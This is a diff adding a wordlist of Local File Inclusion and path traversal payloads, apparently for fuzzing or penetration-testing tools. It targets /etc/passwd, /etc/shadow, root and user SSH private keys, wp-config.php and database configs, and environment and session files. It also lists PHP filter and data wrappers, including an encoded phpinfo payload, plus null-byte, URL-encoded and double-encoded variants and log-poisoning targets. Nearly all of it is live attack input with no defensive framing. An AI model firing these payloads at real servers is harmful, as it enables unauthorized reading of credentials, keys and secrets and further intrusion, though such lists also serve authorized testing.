@@ -1,0 +1,251 @@
+# LFI (Local File Inclusion) Payloads
+# Common Linux targets
+etc/passwd
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+../../../../../../../../../../../etc/passwd
+
+# Linux shadow file
+etc/shadow
+../etc/shadow
+../../etc/shadow
+../../../etc/shadow
+../../../../etc/shadow
+
+# Proc filesystem
+proc/version
+../proc/version
+../../proc/version
+../../../proc/version
+../../../../proc/version
+
+proc/self/environ
+../proc/self/environ
+../../proc/self/environ
+../../../proc/self/environ
+../../../../proc/self/environ
+
+proc/self/cmdline
+../proc/self/cmdline
+../../proc/self/cmdline
+../../../proc/self/cmdline
+../../../../proc/self/cmdline
+
+# Linux logs
+var/log/apache2/access.log
+../var/log/apache2/access.log
+../../var/log/apache2/access.log
+../../../var/log/apache2/access.log
+../../../../var/log/apache2/access.log
+
+var/log/apache2/error.log
+../var/log/apache2/error.log
+../../var/log/apache2/error.log
+../../../var/log/apache2/error.log
+../../../../var/log/apache2/error.log
+
+var/log/httpd/access_log
+../var/log/httpd/access_log
+../../var/log/httpd/access_log
+../../../var/log/httpd/access_log
+../../../../var/log/httpd/access_log
+
+var/log/httpd/error_log
+../var/log/httpd/error_log
+../../var/log/httpd/error_log
+../../../var/log/httpd/error_log
+../../../../var/log/httpd/error_log
+
+# Windows targets
+windows/win.ini
+../windows/win.ini
+../../windows/win.ini
+../../../windows/win.ini
+../../../../windows/win.ini
+
+windows/system32/drivers/etc/hosts
+../windows/system32/drivers/etc/hosts
+../../windows/system32/drivers/etc/hosts
+../../../windows/system32/drivers/etc/hosts
+../../../../windows/system32/drivers/etc/hosts
+
+boot.ini
+../boot.ini
+../../boot.ini
+../../../boot.ini
+../../../../boot.ini
+
+windows/system.ini
+../windows/system.ini
+../../windows/system.ini
+../../../windows/system.ini
+../../../../windows/system.ini
+
+# Common web application files
+index.php
+../index.php
+../../index.php
+../../../index.php
+../../../../index.php
+
+config.php
+../config.php
+../../config.php
+../../../config.php
+../../../../config.php
+
+wp-config.php
+../wp-config.php
+../../wp-config.php
+../../../wp-config.php
+../../../../wp-config.php
+
+.htaccess
+../.htaccess
+../../.htaccess
+../../../.htaccess
+../../../../.htaccess
+
+# PHP wrappers
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../index.php
+php://filter/convert.base64-encode/resource=../../index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/convert.base64-encode/resource=wp-config.php
+php://filter/convert.base64-encode/resource=../wp-config.php
+
+# Data wrapper
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+data://text/plain,<?php phpinfo(); ?>
+
+# File protocol
+file:///etc/passwd
+file:///windows/win.ini
+file:///c:/windows/win.ini
+
+# Null byte (for older PHP versions)
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.png
+../../../etc/passwd%00.txt
+
+# URL encoding
+..%2F..%2F..%2Fetc%2Fpasswd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Double encoding
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# Common Apache/Nginx configs
+etc/apache2/apache2.conf
+../etc/apache2/apache2.conf
+../../etc/apache2/apache2.conf
+../../../etc/apache2/apache2.conf
+
+etc/nginx/nginx.conf
+../etc/nginx/nginx.conf
+../../etc/nginx/nginx.conf
+../../../etc/nginx/nginx.conf
+
+usr/local/apache2/conf/httpd.conf
+../usr/local/apache2/conf/httpd.conf
+../../usr/local/apache2/conf/httpd.conf
+../../../usr/local/apache2/conf/httpd.conf
+
+# SSH keys
+home/user/.ssh/id_rsa
+../home/user/.ssh/id_rsa
+../../home/user/.ssh/id_rsa
+../../../home/user/.ssh/id_rsa
+
+root/.ssh/id_rsa
+../root/.ssh/id_rsa
+../../root/.ssh/id_rsa
+../../../root/.ssh/id_rsa
+
+# Database configs
+etc/mysql/my.cnf
+../etc/mysql/my.cnf
+../../etc/mysql/my.cnf
+../../../etc/mysql/my.cnf
+
+var/lib/mysql/mysql/user.MYD
+../var/lib/mysql/mysql/user.MYD
+../../var/lib/mysql/mysql/user.MYD
+../../../var/lib/mysql/mysql/user.MYD
+
+# Application specific
+application/config/database.php
+../application/config/database.php
+../../application/config/database.php
+
+app/config/database.yml
+../app/config/database.yml
+../../app/config/database.yml
+
+# Common CMS files
+sites/default/settings.php
+../sites/default/settings.php
+../../sites/default/settings.php
+../../../sites/default/settings.php
+
+configuration.php
+../configuration.php
+../../configuration.php
+../../../configuration.php
+
+# Java/Tomcat
+WEB-INF/web.xml
+../WEB-INF/web.xml
+../../WEB-INF/web.xml
+../../../WEB-INF/web.xml
+
+META-INF/context.xml
+../META-INF/context.xml
+../../META-INF/context.xml
+../../../META-INF/context.xml
+
+# Common backup files
+index.php.bak
+../index.php.bak
+../../index.php.bak
+
+config.php.bak
+../config.php.bak
+../../config.php.bak
+
+# Log poisoning targets (for log file inclusion attacks)
+var/log/mail
+../var/log/mail
+../../var/log/mail
+../../../var/log/mail
+
+var/log/auth.log
+../var/log/auth.log
+../../var/log/auth.log
+../../../var/log/auth.log
+
+# Session files
+var/lib/php/sessions/sess_
+../var/lib/php/sessions/sess_
+../../var/lib/php/sessions/sess_
+
+tmp/sess_
+../tmp/sess_
+../../tmp/sess_
+
+# Traversal with common file extensions
+../../../etc/passwd.txt
+../../../etc/passwd.php
+../../../etc/passwd.asp
+../../../etc/passwd.jsp 
